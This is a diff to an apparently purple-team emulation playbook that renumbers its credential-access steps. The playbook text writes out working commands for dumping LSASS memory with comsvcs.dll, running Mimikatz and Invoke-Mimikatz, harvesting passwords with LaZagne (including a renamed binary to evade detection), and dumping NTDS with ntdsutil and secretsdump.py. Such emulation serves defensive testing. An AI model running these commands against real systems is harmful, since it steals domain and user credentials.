@@ -200,34 +200,22 @@ rundll32 ""advpack.dll,#-4294967284"" ""cmd.exe /c calc.exe""
    ```
    rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id C:\Users\purple\lsass-comsvcs.dmp full
    ```
-3. Download Mimikatz here: https://github.com/gentilkiwi/mimikatz/releases/latest and run the following in an elevated command prompt:
-   2.1
+2. Download Mimikatz here: https://github.com/gentilkiwi/mimikatz/releases/latest and run the following in an elevated command prompt:
    ```
    mimikatz.exe
-   ```
-   
-   2.2
-   ```
    privilege::debug
-   ```
-   
-   2.3
-   ```
    sekurlsa::logonpasswords
    ```
 
-5. Download ""Invoke-Mimikatz"" as m.ps1 and run the following in an elevated Powershell prompt:
-  3.1
+3. Download ""Invoke-Mimikatz"" as m.ps1 and run the following in an elevated Powershell prompt:
    ```
    Import-Module C:\Users\purple\m.ps1; Invoke-Mimikatz -ComputerName <COMPUTER_NAME>
    ```
-7. Download LaZagne here: https://github.com/AlessandroZ/LaZagne/releases/latest and run the following in an elevated command prompt:
-  4.1
+4. Download LaZagne here: https://github.com/AlessandroZ/LaZagne/releases/latest and run the following in an elevated command prompt:
    ```
    lazagne.exe all -oN -output C:\Users\purple
    ```
-9. Execute the same procedure as 4 but with a renamed binary 
-  5.1
+5. Execute the same procedure as 4 but with a renamed binary 
    ```
    ls.exe all -oN -output C:\Users\purple
    ```
@@ -235,18 +223,17 @@ rundll32 ""advpack.dll,#-4294967284"" ""cmd.exe /c calc.exe""
 ### Step 23 - Credential Access: T1003.003 OS Credential Dumping: NTDS
 
 1. Dump NTDS with ntdsutil by running the following in a command prompt on DC:
-   1.1
    ```
    ntdsutil ""ac i ntds"" ""ifm"" ""create full dump_folder"" q q
    ```
 
 3. Dump NTDS using secretsdump.py downloaded at: https://github.com/fortra/impacket/blob/master/examples/secretsdump.py
-   2.1
+   2.1 Normal execution with replication service
    ```
    python3 secretsdump.py -just-dc domain/user@DChostname
    ```
    
-   2.2
+   2.2 Execution using VSS
    ```
    python3 secretsdump.py -just-dc domain/user@DC hostname -use-vss
    ```
